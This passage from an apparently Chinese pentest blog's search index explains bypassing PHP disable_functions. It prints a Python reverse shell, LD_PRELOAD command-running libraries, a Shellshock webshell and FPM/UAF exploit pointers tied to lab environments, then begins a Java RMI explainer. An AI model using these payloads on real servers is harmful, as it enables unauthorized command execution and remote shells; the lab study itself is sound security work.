'pcntl extension is not support!'; } ?\u003e 由于 pcntl_exec() 执行命令是没有回显的，所以其常与 python 结合来反弹 shell： \u003c?php pcntl_exec(\"/usr/bin/python\",array('-c','import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((\"IP\",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);')); 蓝帽杯决赛中存在相关利用方式。 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:2:0","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"3 利用 LD_PRELOAD 环境变量 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:3:0","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"3.1 原理 LD_PRELOAD 是 Linux 系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它可以在用户的程序运行前优先加载该动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，可以利用此功能来使用自定义的函数，而另一方面，可以向别人的程序注入程序，从而达到特定的攻击目的。 前提： 能够上传 .so 文件 能够控制 LD_PRELOAD 环境变量的值，比如 putenv() 函数 因为新进程启动将加载 LD_PRELOAD 中的 .so 文件，所以要存在可以控制 PHP 启动外部程序的函数并能执行，比如 mail()、imap_mail()、mb_send_mail() 和 error_log() 函数等 下面介绍两种常用的利用方式。 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:3:1","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"3.2 劫持函数(uid) 3.2.1 原理 编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 getuid_shadow.so； 运行 PHP 函数 putenv()（用来配置系统环境变量），设定环境变量 LD_PRELOAD 为 getuid_shadow.so，以便后续启动新进程时优先加载该共享对象； 运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 getuid_shadow.so 中的同名 getuid() 所劫持；达到不调用 PHP 的各种命令执行函数（system、exec 等等）仍可执行系统命令的目的。 3.2.2 利用 #include \u003cstdlib.h\u003e#include \u003cstdio.h\u003e#include \u003cstring.h\u003evoid payload() { system(\"ls \u003e /tmp/leon\"); } int getuid() { if (getenv(\"LD_PRELOAD\") == NULL) { return 0; } unsetenv(\"LD_PRELOAD\"); payload(); } 编译成 so 文件： gcc -c -fPIC exp.c -o hack \u0026\u0026 gcc --share hack -o exp.so 编写 test.php： \u003c?php putenv(\"LD_PRELOAD=./exp.so\"); mail(\"\",\"\",\"\",\"\",\"\"); ?\u003e 但是，在真实环境中，存在两方面问题： 一是，某些环境中，web 禁止启用 sendmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件； 二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts。 基于这两种方式，衍生出一种新的利用方式。 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:3:2","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"3.3 劫持启动进程 回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那就完全可以不依赖 sendmail 了。 3.3.1 __attribute__ 介绍 GCC 有个 C 语言扩展修饰符 __attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute__((constructor)) 修饰的函数。 3.2.2 利用 简单的 exp： #define _GNU_SOURCE #include \u003cstdlib.h\u003e#include \u003cunistd.h\u003e#include \u003csys/types.h\u003e __attribute__ ((__constructor__)) void preload (void){ unsetenv(\"LD_PRELOAD\"); system(\"whoami \u003e /tmp/leon\"); } 但是unsetenv()在 Centos 上无效，因为 Centos 自己也hook了 unsetenv()，在其内部启动了其他进程，来不及删除 LD_PRELOAD 就又被劫持，导致无限循环，可以使用全局变量 extern char** environ删除，实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。 #define _GNU_SOURCE #include \u003cstdlib.h\u003e#include \u003cstdio.h\u003e#include \u003cstring.h\u003e extern char** environ; __attribute__ ((__constructor__)) void preload (void) { // get command line options and arg const char* cmdline = getenv(\"EVIL_CMDLINE\"); // unset environment variable LD_PRELOAD. // unsetenv(\"LD_PRELOAD\") no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], \"LD_PRELOAD\")) { environ[i][0] = '\\0'; } } // executive command system(cmdline); } 使用 for 循环修改 LD_PRELOAD 的首个字符改成 \\0，\\0 是 C 语言字符串结束标记，这样可以让系统原有的 LD_PRELOAD 环境变量自动失效。 编译： gcc -c -fPIC exp.c -o hack \u0026\u0026 gcc --share hack -o exp.so 详情可见：bypass_disablefunc_via_LD_PRELOAD。 在 AntSword-Labs 有相关环境，复现该漏洞。 尝试执行命令： 使用 LD_PRELOAD 插件绕过： 成功后可以看到 /var/www/html/ 目录下新建了一个 .antproxy.php 文件。我们创建副本, 并将连接的 URL shell 脚本名字改为 .antproxy.php，就可以成功执行命令。 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:3:3","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"4 利用「破壳漏洞」- ShellShock ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:4:0","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"4.1 前提 Linux 操作系统 putenv()、mail() 或 error_log() 函数可用 目标系统的 /bin/bash 存在 CVE-2014-6271 漏洞 /bin/sh -\u003e /bin/bash sh 默认的 shell 是 bash ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:4:1","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"4.2 原理 该方法利用的 bash 中的一个老漏洞，即 Bash Shellshock 破壳漏洞（CVE-2014-6271）。 在 Bash 中一种独有的方法来定义函数 , 即 : 通过环境变量来定义函数。当某个环境变量的值以字符串 () { 的格式作为开头， 那么该变量就会被当前 Bash 当作一个导出函数( export function ) , 该函数仅会在当前 Bash 的子进程中生效。 一般函数体内的代码不会被执行，但破壳漏洞会错误的将 {} 花括号外的命令进行执行。PHP 里的某些函数（例如：mail()、imap_mail()）能调用 popen 或其他能够派生 bash 子进程的函数，可以通过这些函数来触发破壳漏洞(CVE-2014-6271)执行命令。 EXP 脚本： \u003c?php function runcmd($c){ $d = dirname($_SERVER[\"SCRIPT_FILENAME\"]); if(substr($d, 0, 1) == \"/\" \u0026\u0026 function_exists('putenv') \u0026\u0026 (function_exists('error_log') || function_exists('mail'))){ if(strstr(readlink(\"/bin/sh\"), \"bash\")!=FALSE){ $tmp=tempnam(sys_get_temp_dir(), 'as'); putenv(\"PHP_LOL=() { x; }; $c\u003e$tmp2\u003e\u00261\"); if (function_exists('error_log')) { error_log(\"a\", 1); }else{ mail(\"a@127.0.0.1\", \"\", \"\", \"-bv\"); } }else{ print(\"Not vuln (not bash)\\n\"); } $output = @file_get_contents($tmp); @unlink($tmp); if($output!=\"\"){ print($output); }else{ print(\"No output, or not vuln.\"); } }else{ print(\"不满足使用条件\"); } } // runcmd(\"whoami\"); // 要执行的命令 runcmd($_REQUEST[\"cmd\"]); // ?cmd=whoami ?\u003e ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:4:2","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"4.3 利用 同样利用 AntSword-Labs 里的环境：bypass_disable_functions/2 尝试使用 http://IP:18080/?ant=system('ls'); 执行失败。 AntSword 虚拟终端中已经集成了对 ShellShock 的利用，直接在虚拟终端执行命令即可绕过disable_functions： 上图中进程树可以看到，利用了 PHP error_log 函数在执行 sh -c -t -i 时, Bash 的 ShellShock 漏洞, 从而实现了执行我们自定义命令的目的。 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:4:3","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"5 利用 CGI ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:5:0","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"5.1 Apache Mod CGI 5.1.1 前提 Linux 操作系统 Apache + PHP (apache 使用 apache_mod_php) Apache 开启了 cgi、rewrite Web 目录给了 AllowOverride 权限 当前目录可写 5.1.2 原理 为了解决 Web 服务器与外部应用程序（CGI程序）之间数据互通，于是出现了CGI（Common Gateway Interface）通用网关接口。简单理解，可以认为 CGI 是 Web 服务器和运行在其上的应用程序进行“交流”的一种约定。 当遇到动态脚本请求时，Web 服务器主进程就会 Fork 创建出一个新的进程来启动 CGI 程序，运行外部 C 程序或 Perl、PHP 脚本等，也就是将动态脚本交给 CGI 程序来处理。启动 CGI 程序需要一个过程，如读取配置文件、加载扩展等。当 CGI 程序启动后会去解析动态脚本，然后将结果返回给 Web 服务器，最后由 Web 服务器将结果返回给客户端，之前 Fork 出来的进程也随之关闭。这样，每次用户请求动态脚本，Web 服务器都要重新 Fork 创建一个新进程去启动 CGI 程序，由 CGI 程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。 而对于 Mod CGI，Web 服务器可以内置 Perl 解释器或 PHP 解释器。 也就是说将这些解释器做成模块的方式，Web 服务器会在启动的时候就启动这些解释器。 当有新的动态请求进来时，Web 服务器就是自己解析这些动态脚本，省得重新 Fork 一个进程，效率提高了。 任何具有 MIME 类型 application/x-httpd-cgi 或者被 cgi-script 处理器处理的文件都将被作为 CGI 脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为 CGI 脚本，一种是文件具有已由 AddType 指令定义的扩展名，另一种是文件位于 ScriptAlias 目录中。 Apache 在配置开启 CGI 后可以用 ScriptAlias 指令指定一个目录，指定的目录下面便可以存放可执行的 CGI 程序。若是想临时允许一个目录可以执行 CGI 程序并且使得服务器将自定义的后缀解析为 CGI 程序执行，则可以在目的目录下使用 htaccess 文件进行配置，如下： Options +ExecCGI AddHandler cgi-script .xxx 这样便会将当前目录下的所有的 .xxx 文件当做 CGI 程序执行了。由于 CGI 程序可以执行命令，那我们可以利用 CGI 来执行系统命令绕过 disable_functions。 5.1.3 利用 同样利用 AntSword-Labs 里的环境：bypass_disable_functions/3 用蚁剑拿到 shell 后无法执行命令： 开启 CGI： ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:5:1","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"5.2 PHP-fpm 5.2.1 前提 Linux 操作系统 PHP-FPM 存在可写的目录，需要上传 .so 文件 5.2.2 原理 PHP-FPM 是 Fastcgi 的协议解析器，Web 服务器使用 CGI 协议封装好用户的请求发送给 FPM。FPM 按照 CGI 的协议将 TCP 流解析成真正的数据。 举个例子，用户访问 http://127.0.0.1/index.php?a=1\u0026b=2 时，如果 web 目录是 /var/www/html，那么 Nginx 会将这个请求变成如下 key-value 对： { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1\u0026b=2', 'REQUEST_URI': '/index.php?a=1\u0026b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1' } 这个数组其实就是 PHP 中 $_SERVER 数组的一部分，也就是 PHP 里的环境变量。但环境变量的作用不仅是填充 $_SERVER 数组，也是告诉 fpm：要执行哪个 PHP 文件。 PHP-FPM 拿到 Fastcgi 的数据包后，进行解析，得到上述这些环境变量。然后，执行 SCRIPT_FILENAME 的值指向的 PHP 文件，也就是 /var/www/html/index.php 。 5.2.3 利用 由于 FPM 默认监听的是 9000 端口，我们就可以绕过 Web 服务器，直接构造 Fastcgi 协议，和 fpm 进行通信。于是就有了利用 Webshell 直接与 FPM 通信 来绕过 disable functions 的姿势。 但是，在构造 Fastcgi，就能执行任意 PHP 代码前，需要突破几个限制： 既然是请求，那么 SCRIPT_FILENAME 就相当的重要。前面说过，fpm 是根据这个值来执行 PHP 文件文件的，如果不存在，会直接返回 404，所以想要利用这个漏洞，就得找到一个已经存在的 PHP 文件。在一般进行源安装 PHP 的时候，服务器都会附带上一些 PHP 文件，如果说我们没有收集到目标 Web 目录的信息的话，可以采用这种方法。 即使能控制 SCRIPT_FILENAME，让 fpm 执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。那要如何绕过这种限制呢？可以从 php.ini 入手。它有两个特殊选项，分别是 auto_prepend_file 和 auto_append_file。auto_prepend_file 的功能是在执行目标文件之前，先包含它指定的文件。那么就有趣了，假设我们设置 auto_prepend_file 为php://input，那么就等于在执行任何 PHP 文件前都要包含一遍 POST 过去的内容。所以，只需要把待执行的代码放在 POST Body 中进行远程文件包含，这样就能做到任意代码执行了。 虽然可以通过远程文件包含执行任意代码，但是远程文件包含是有 allow_url_include 这个限制因素的，如果没有为 ON 的话就没有办法进行远程文件包含。这里，PHP-FPM 有两个可以设置 PHP 配置项的 KEY-VALUE，即 PHP_VALUE 和 PHP_ADMIN_VALUE，PHP_VALUE可以用来设置 php.ini，PHP_ADMIN_VALUE 则可以设置所有选项（disable_functions 选项除外），这样就解决问题了。 利用 AntSword-Labs 里的环境：bypass_disable_functions/4 用蚁剑拿到 shell 后无法执行命令： 注意该模式下需要选择 PHP-FPM 的接口地址, 需要自行找配置文件查 FPM 接口地址，默认的是 unix:/// 本地 socket 这种的，如果配置成 TCP 的默认是 127.0.0.1:9000 成功后可以看到 /var/www/html/ 目录下新建了一个 .antproxy.php 文件。连接 .antproxy.php，就可以成功执行命令。 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:5:2","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"6 利用 UAF Bypass ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:6:0","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"6.1 GC UAF 6.1.1 前提 Linux 操作系统 PHP 7.0 - PHP 7.3 6.1.2 原理 此漏洞利用 PHP 垃圾收集器中存在三年的一个 bug ，通过PHP垃圾收集器中堆溢出来绕过 disable_functions 并执行系统命令。 利用脚本：https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass 6.1.3 利用 蚁剑靶场 bypass_disable_functions/7 用蚁剑拿到 shell 后无法执行命令： ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:6:1","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"6.2 Json Serializer UAF 6.2.1 前提 Linux 操作系统 PHP 版本 7.1 - all versions to date 7.2 \u003c 7.2.19 (released: 30 May 2019) 7.3 \u003c 7.3.6 (released: 30 May 2019) 6.2.2 原理 此漏洞利用 json 序列化程序中的释放后使用漏洞，利用 json 序列化程序中的堆溢出触发，以绕过 disable_functions 和执行系统命令。 利用脚本：https://github.com/mm0r1/exploits/tree/master/php-json-bypass 6.2.3 利用 蚁剑靶场 bypass_disable_functions/6 用蚁剑拿到 shell 后无法执行命令： 警告 这种方式不一定保证成功，因此当遇到命令无回显结果的时候，可以重新执行。 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:6:2","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"6.3 Backtrace UAF 6.3.1 前提 Linux 操作系统 PHP 版本 7.0 - all versions to date 7.1 - all versions to date 7.2 - all versions to date 7.3 \u003c 7.3.15 (released 20 Feb 2020) 7.4 \u003c 7.4.3 (released 20 Feb 2020) 6.3.2 原理 该漏洞利用在 debug_backtrace() 函数中使用了两年的一个 bug。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞。 利用脚本：https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:6:3","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"6.4 SplDoublyLinkedList UAF 6.4.1 前提 PHP 版本 PHP v7.4.10及其之前版本 PHP v8.0（Alpha） 6.4.2 原理 具体原理参考：https://xz.aliyun.com/t/8355 将脚本上传到目标主机上有权限的目录中（/var/tmp/exploit.php），包含该 exploit.php 脚本即可成功执行命令。 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:6:4","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"7 利用 FFI 扩展执行命令 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:7:0","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"7.1 前提 Linux 操作系统 PHP \u003e= 7.4 开启了 FFI 扩展且 ffi.enable=true ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:7:1","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"7.2 原理 PHP 7.4 的 FFI（Foreign Function Interface），即外部函数接口，允许从用户在 PHP 代码中去调用 C 代码。 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:7:2","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"7.3 利用 利用 AntSword-Labs 里的环境，用蚁剑拿到 shell 后无法执行命令： ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:7:3","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"8 利用 ImageMagick ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:8:0","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"8.1 前提 目标主机安装了漏洞版本的 imagemagick（\u003c= 3.3.0） 安装了 php-imagick 拓展并在 php.ini 中启用 编写 php 通过 new Imagick 对象的方式来处理图片等格式文件 PHP \u003e= 5.4 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:8:1","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"8.2 原理 利用 ImageMagick 绕过 disable_functions 的方法利用的是 ImageMagick 的一个漏洞（CVE-2016-3714）。漏洞的利用过程非常简单，只要将精心构造的图片上传至使用漏洞版本的 ImageMagick，ImageMagick 会自动对其格式进行转换，转换过程中就会执行攻击者插入在图片中的命令。因此很多具有头像上传、图片转换、图片编辑等具备图片上传功能的网站都可能会中招。所以如果在 phpinfo 中看到有这个 ImageMagick。 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:8:2","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"8.3 利用 参考：Imagetragick 命令执行漏洞 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:8:3","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"参考 Bypass Disable Functions 浅谈几种Bypass-disable-functions的方法 bypass-disable_function-php ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:9:0","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["代码审计"],"content":"反序列化涉及到的相关协议","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/","tags":["代码审计"],"title":"Java反序列化漏洞系列-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["代码审计"],"content":"反序列化攻击涉及到的相关协议 RMI 和 JNDI 都是 Java 分布式中运用较多的技术，JRMP 远程消息交换协议，运行于 Java RMI 之下，是一种底层传输协议。 如果拿 Web 应用来举例子，那么 RMI 就像是 HTTP 协议，JNDI 就像是 Apache HTTP Server，JRMP 则相当于 TCP 协议。HTTP 向后端请求文件，后端中间件实际上不止 Apache 一种，还可以是 IIS、Tomcat 等，而底层都是基于 TCP 协议来传输数据的。 ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:0:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["代码审计"],"content":"1 RMI ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:1:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["代码审计"],"content":"1.1 RMI 原理 RMI 全称是 Remote Method Invocation，远程方法调用。其的⽬标和 RPC 类似的，是让某个 Java 虚拟机上的对象调用另一个 Java 虚拟机中对象上的方法。 整个过程有三个组织参与：Client、Registry(注册中心)、Server。 RMI的传输是基于反序列化的。 对于任何一个以对象为参数的 RMI 接口，构建对象，使服务器端将其按任何一个存在于服务端 classpath 中的可序列化类来反序列化恢复对象。 RMI 涉及到参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的 serialVersionUID 字段要与服务器端保持一致。 问题 什么是 Stub？ 每个远程对象都包含一个代理对象 Stub，当运行在本地 Java 虚拟机上的程序调用运行在远程 Java 虚拟机上的对象方法时，它首先在本地创建该对象的代理对象 Stub，然后调用代理对象上匹配的方法。 Stub 对象负责调用参数和返回值的流化(Serialization)、打包解包，以及网络层的通讯过程。 什么是 Skeleton？ 每一个远程对象同时也包含一个 Skeleton 对象，Skeleton 运行在远程对象所在的虚拟机上，接受来自 stub 对象的调用。 RMI 中的基本操作： lookup bind unbind list rebind ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:1:1","tags":["代码审计"],"title":"Java反序列化漏洞系列-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["代码审计"],"content":"1.2 模拟 Java RMI 利用过程 1.2.1 RMI Server package com.geekby.javarmi; import java.rmi.Naming; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.server.UnicastRemoteObject; public class RMIServer { public interface IRemoteHelloWorld extends Remote { public String hello() throws RemoteException; } public class RemoteHelloWorld extends UnicastRemoteObject implements RMIServer.IRemoteHelloWorld { protected RemoteHelloWorld() throws RemoteException { super(); } @Override public String hello() throws RemoteException { return \"Hello World\"; } } private void start() throws Exception { RemoteHelloWorld h = new RemoteHelloWorld(); // 创建并运行 RMI Registry LocateRegistry.createRegistry(1099); // 将 RemoteHelloWorld 对象绑定到 Hello 这个名字上 Naming.rebind(\"rmi://127.0.0.1:1099/Hello\", h); } public static void main(String[] args) throws Exception { new RMIServer().start(); } } 上面提到过，⼀个 RMI Server 分为三部分： ⼀个继承了 java.rmi.Remote 的接口，其中定义要远程调⽤的函数，⽐如上面的 hello() ⼀个实现了此接⼝的类 ⼀个主类，⽤来创建 Registry，并将上面的类实例化后绑定到一个地址，即 Server。 在上面的示例代码里，将 Registry 与 Server 合并到一起。 Naming.bind 的第一个参数是一个 URL，形如：rmi://host:port/name 。其中， host 和 port 就是 RMI Registry 的地址和端口，name 是远程对象的名字。 信息 如果 RMI Registry 在本地运行，那么 host 和 port 是可以省略的，此时 host 默认是 localhost，port 默认是 1099。 Naming.bind(\"Hello\", newRemoteHelloWorld()); 1.2.2 RMI Client package com.geekby.javarmi; import java.rmi.Naming; public class RMIClient { public static void main(String[] args) throws Exception { RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming.lookup(\"rmi://127.0.0.1:1099/Hello\"); String ret = hello.hello(); System.out.println(ret); } } 客户端使用 Naming.lookup 在 Registry 中寻找到名字是 Hello 的对象，后⾯的使⽤用就和在本地使用是一致的。 